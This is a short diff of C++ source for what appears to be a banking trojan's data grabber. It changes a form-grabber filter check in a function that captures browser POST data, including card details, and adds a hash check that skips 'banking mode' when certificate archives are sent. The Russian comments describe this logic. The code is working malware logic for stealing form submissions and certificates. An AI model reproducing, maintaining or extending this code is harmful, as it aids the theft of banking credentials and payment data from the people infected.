@@ -1727,7 +1727,7 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 			if (!FiltrateFormGrabberURL(URL))
 				return false;
 
-			if (FiltrateFormGrabberData(Data))
+			if (!FiltrateFormGrabberData(Data))
 				return false;
         }
 	#endif
@@ -1740,6 +1740,7 @@ bool DataGrabber::AddHTMLFormData(PCHAR URL, PCHAR Data, PCHAR UserAgent, DWORD 
 	PCHAR SendData = STR::New(3, URL, "?|POST:", Data);
 
 	bool Res = AddData(URL, SendData, UserAgent, Browser, DataType, ContainCard);
+
 
 	STR::Free(SendData);
 	return Res;
@@ -1925,8 +1926,10 @@ bool DataGrabber::SendCab(PCHAR URL, PCHAR CabFileName, PCHAR AppName, bool* Inv
 		return false;
 
 
-    // При любой отправке каба включаем режим Банк
-    SetBankingMode();
+	// При любой отправке каба включаем режим Банк
+	// игнорируем отправку сертификатов
+    if (AnsiStr::Hash(AppName) != 0xC797974 /* cert */)
+    	SetBankingMode();
 
 
 	// Уведомляем монитор об отправке каба
